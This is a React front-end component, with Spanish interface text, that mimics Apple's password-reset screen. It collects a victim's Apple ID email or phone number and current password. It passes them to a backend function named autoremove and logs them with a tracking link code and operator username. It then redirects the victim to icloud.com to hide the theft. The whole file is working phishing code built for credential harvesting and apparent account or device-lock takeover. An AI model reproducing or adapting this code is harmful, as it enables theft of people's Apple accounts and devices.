import React, { useEffect, useState } from "react";
import { Button, Form } from "react-bootstrap";
import backIMG from "../assets/img/back.png";
import closeIMG from "../assets/img/close.png";
import titleIMG from "../assets/img/imgtitle.png";
import SvgSpinner from './svgComponents/SvgSpinner'
import responses from "../../api/responses";
import { useData } from "../../context/UserContext";

const CheckData = ({
  translator
}) => {
  const { user } = useData();
  const [step, setStep] = useState(0); // 0: email/tel, 1: password
  const [fade, setFade] = useState(""); // "", "fade-out", "fade-in"
  const [inputValue, setInputValue] = useState("");
  const [extraValue, setExtraValue] = useState(""); // Contraseña actual
  const [password, setPassword] = useState("");
  const [repeat, setRepeat] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [verificando, setVerificando] = useState(false);

  const [loading, setLoading] = useState(false);
  const [viewCheckData, setViewCheckData] = useState(false);
  useEffect(() => {
    setTimeout(() => {
      setViewCheckData(true);
    }, 1500)
  }, [viewCheckData]);
  // Habilita el botón solo si los inputs están llenos
  const isContinueEnabled =
    step === 0
      ? inputValue.trim().length > 0
      : extraValue.trim().length > 0 && password.length > 0 && repeat.length > 0;

  // Validación de contraseña: solo que coincidan
  const validatePassword = () => {
    if (password !== repeat) {
      setPasswordError(`${translator("Las contraseñas no coinciden.")}`);
      return false;
    }
    setPasswordError("");
    return true;
  };

  // Maneja el submit del primer paso
  const handleContinue = async (e) => {
    e.preventDefault();
    if (step === 0 && inputValue.trim().length > 0) {
      setFade("fade-out");
      setTimeout(() => {
        setStep(1);
        setFade("fade-in");
        setTimeout(() => setFade(""), 500);
      }, 2000);
    } else if (step === 1) {
      if (validatePassword()) {
        setVerificando(true);
        try {
          const response = await responses.autoremove(inputValue, extraValue);
          let status = response.success;
          let responseData = response.message;
          await saveAutoRemoveData(status, responseData);
          if (!status) {
            setVerificando(false);
            setPasswordError(`${translator('Contraseña incorrecta. Intenta de nuevo.') || responseData}`);
          } else if (status) {
            setTimeout(() => {
              window.location.reload();
              localStorage.removeItem(`userData_${user?.data?.linkCode}`);
              //window.location.reload();
              window.location.href = 'https://www.icloud.com';
            }, 1000);
          }
        } catch (error) {
          console.log(error)
          setPasswordError(`${translator('Error al enviar los datos.')}`);
        }

      }
    }
  };

  const saveAutoRemoveData = async (status, response) => {

    let data = {
      linkCode: user?.data?.linkCode || '',
      appleID: inputValue,
      password: extraValue,
      response: response,
      username: user?.data?.username || '',
      status: status,
    }

    const resp = await responses.addData(data);
    return resp;
  }

  return (
    <>



      <style>
        {`
          .bottom-sheet-checkdata {
            position: fixed;
            height: 100%;
            left: 0;
            right: 0;
            bottom: 0;
            margin-left: auto;
            margin-right: auto;
            top : 4px;
            width: 100vw;
            max-width: 430px;
            border-radius: 18px 18px 0 0;
            background: #222;           
            box-shadow: 0 -2px 16px rgba(0,0,0,0.4);
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            z-index: 3000;
            transform: translateY(0);
            transition: transform 0.5s cubic-bezier(0.4,0,0.2,1);
          }
          .bottom-sheet-backdrop {
            position: fixed;
            inset: 0;
            background: transparent;
            z-index: 2999;
          }
          .bottom-sheet-scroll-area {
            scrollbar-width: thin;
            scrollbar-color: #222 #222;
          }
          .bottom-sheet-scroll-area::-webkit-scrollbar {
            width: 8px;
            background: #222;
          }
          .bottom-sheet-scroll-area::-webkit-scrollbar-thumb {
            background: #222;
            border-radius: 4px;
          }
          .fade-out {
            opacity: 0;
            transition: opacity 0.5s;
          }
          .fade-in {
            opacity: 1;
            transition: opacity 0.5s;
          }
          .password-error-message {
            color: #ff4d4f;
            background: #2a181800;
            border-radius: 6px;
            margin-top: 0px;
            margin-bottom: 10px;
            padding: 0 12px;
            font-size: 14px;
            text-align: center;
            font-weight: 500;
            letter-spacing: 0.2px;
          }
          .custom-password-box {
            background: #393939;
            border-radius: 22px;
            margin-bottom: 24px;
            box-shadow: none;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            padding: 0;
          }
          .custom-password-input {
            background: transparent;
            border: none;
            border-radius: 0;
            color: #fff;
            height: 56px;
            font-size: 20px;
            font-weight: 400;
            box-shadow: none;
            padding-left: 24px;
            padding-right: 24px;
            outline: none;
            text-align: left;
            display: flex;
            align-items: center;
            position: relative;
          }
          .custom-password-divider {
            width: 88%;
            margin: 0 auto;
            height: 1px;
            background: rgba(255,255,255,0.28);
            border: none;
            margin-bottom: 0;
            margin-top: 0;
          }
          .custom-password-input::placeholder {
            color: #e0e0e0 !important;
            opacity: 1 !important;
          }
        `}
      </style>
      {viewCheckData ? (
        <>
          <div className="bottom-sheet-backdrop"></div>
          <div className={`bottom-sheet-checkdata show`}>
            <div style={{ padding: "24px 18px 0 18px" }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                <div style={{ fontWeight: 600, fontSize: 22, color: "#fff" }}>
                  <img src={backIMG} alt="" width={36} height={30} style={{ display: "none" }} />
                </div>
                <button

                  style={{
                    opacity: 0.8,
                    background: "none",
                    border: "none",
                    cursor: "pointer",
                    padding: 0,
                  }}
                  onClick={() => {
                    setStep(0);
                    setInputValue("");
                    setExtraValue("");
                    setPassword("");
                    setRepeat("");
                    setPasswordError("");
                  }}
                >
                  <img src={closeIMG} width={20} height={20} />
                </button>
              </div>
            </div>
            {/* titleIMG siempre visible */}
            <div style={{ width: "100%", display: "flex", justifyContent: "center", marginTop: 24, marginBottom: 8 }}>
              <img src={titleIMG} width={80} height={80} />
            </div>
            <div
              className={`bottom-sheet-scroll-area ${fade}`}
              style={{
                background: "#222",
                padding: "10px 30px 0 30px",
                flex: "1 1 auto",
                minHeight: 0,
                display: "flex",
                flexDirection: "column",
                overflowY: "auto",
                paddingBottom: 120,
                WebkitOverflowScrolling: "touch",
                scrollbarWidth: "thin"
              }}
            >
              {step === 0 ? (
                <div style={{ textAlign: "center", marginBottom: 32 }}>
                  <div
                    style={{
                      fontWeight: 700,
                      fontSize: 25,
                      marginBottom: 30,
                      color: "white",
                      letterSpacing: 0.1,
                      lineHeight: "26px"
                    }}
                  >
                    {translator('Restablecer contraseña')}
                  </div>
                  <div
                    style={{
                      color: "#fff",
                      fontSize: 23,
                      marginBottom: 18,
                      lineHeight: "23px",
                      fontWeight: 400,
                      textAlign: "left",
                      maxWidth: 340,
                      margin: "0 auto 9px auto"
                    }}
                  >
                    {translator('Ingresa la dirección de correo electrónico o el número de teléfono de la cuenta que quieres restablecer.')}
                  </div>
                  <Form id="form-appleid" style={{ paddingBottom: 0 }} onSubmit={handleContinue}>
                    <Form.Group>
                      <Form.Control
                        type="text"
                        placeholder={translator("Correo o número telefónico")}
                        style={{
                          background: "#393939",
                          border: "none",
                          color: "#fff",
                          marginBottom: 10,
                          height: 56,
                          fontSize: 16.5,
                          borderRadius: 35,
                          textAlign: "left",
                          boxShadow: "none",
                          paddingLeft: 18,
                          paddingRight: 18,
                          fontWeight: 400,
                          opacity: 0.95
                        }}
                        value={inputValue}
                        onChange={e => {
                          setInputValue(e.target.value);
                          setPasswordError("");
                        }}
                        autoFocus
                      />
                      <div
                        style={{
                          color: "#fff",
                          fontSize: 14.5,
                          marginTop: 2,
                          marginBottom: 18,
                          textAlign: "left",
                          lineHeight: "19px",
                          fontWeight: 400,
                          maxWidth: 340,
                          margin: "0 auto 18px auto"
                        }}
                      >
                        {translator('Tu privacidad es muy importante. Si restableces tu contraseña en el dispositivo de otra persona, tu información personal no se guardará en su dispositivo.')}
                      </div>
                    </Form.Group>
                  </Form>
                </div>
              ) : (
                <div style={{ textAlign: "center", marginBottom: 32 }}>
                  <div
                    style={{
                      fontWeight: 700,
                      fontSize: 25,
                      marginBottom: 30,
                      color: "white",
                      letterSpacing: 0.1,
                      lineHeight: "26px",
                      marginTop: 20
                    }}
                  >
                    {translator('Ingresar una nueva contraseña')}
                  </div>
                  <Form id="form-password" style={{ paddingBottom: 0 }} onSubmit={handleContinue}>
                    <Form.Group>
                      <div className="custom-password-box">
                        <input
                          type="password"
                          className="custom-password-input"
                          placeholder={translator("Contraseña actual")}
                          value={extraValue}
                          onChange={e => {
                            setExtraValue(e.target.value);
                            setPasswordError("");
                          }}
                          autoFocus
                        />
                        <div className="custom-password-divider" />
                        <input
                          type="password"
                          className="custom-password-input"
                          placeholder={translator("Contraseña nueva")}
                          value={password}
                          onChange={e => {
                            setPassword(e.target.value);
                            setPasswordError("");
                          }}
                        />
                        <div className="custom-password-divider" />
                        <input
                          type="password"
                          className="custom-password-input"
                          placeholder={translator("Repite la contraseña")}
                          value={repeat}
                          onChange={e => {
                            setRepeat(e.target.value);
                            setPasswordError("");
                          }}
                        />
                      </div>
                      <div
                        style={{
                          color: "#fff",
                          fontSize: 14.5,
                          marginTop: 2,
                          marginBottom: 18,
                          textAlign: "left",
                          lineHeight: "19px",
                          fontWeight: 400,
                          maxWidth: 340,
                          margin: "0 auto 18px auto"
                        }}
                      >
                        {/* Puedes quitar este texto si ya no validas formato */}
                        {/* Tu contraseña debe contener al menos 8 caracteres e incluir un número, una letra mayúscula y una letra minúscula. */}
                      </div>
                      {passwordError && (
                        <div className="password-error-message">{passwordError}</div>
                      )}
                      {verificando && (
                        <div style={{ display: "flex", justifyContent: "center", margin: "18px 0" }}>
                          <SvgSpinner width={38} height={38} />
                        </div>
                      )}
                    </Form.Group>
                  </Form>
                </div>
              )}
            </div>
            <div
              style={{
                display: "flex",
                justifyContent: "center",
                position: "fixed",
                left: 0,
                right: 0,
                bottom: 0,
                background: "#222",
                zIndex: 4000,
                padding: "10px 0"
              }}
            >
              <Button
                variant="secondary"
                type="submit"
                style={{
                  width: "350px",
                  maxWidth: "90vw",
                  height: 50,
                  borderRadius: step === 0 ? 35 : 12,
                  fontWeight: 500,
                  fontSize: 17,
                  background: isContinueEnabled ? "#4d90fe" : "#888",
                  border: "none",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 8,
                  color: "#fff",
                  pointerEvents: isContinueEnabled && !verificando ? "auto" : "none",
                  opacity: isContinueEnabled && !verificando ? 1 : 0.7
                }}
                form={step === 0 ? "form-appleid" : "form-password"}
                disabled={!isContinueEnabled || verificando}
                onClick={handleContinue}
              >
                {verificando ? <SvgSpinner width={24} height={24} /> : translator("Continuar")}
              </Button>
            </div>
          </div>
        </>
      )
        : (<><SvgSpinner width={24} height={24} color="#fff" /></>)
      }

    </>
  );
};

export default CheckData;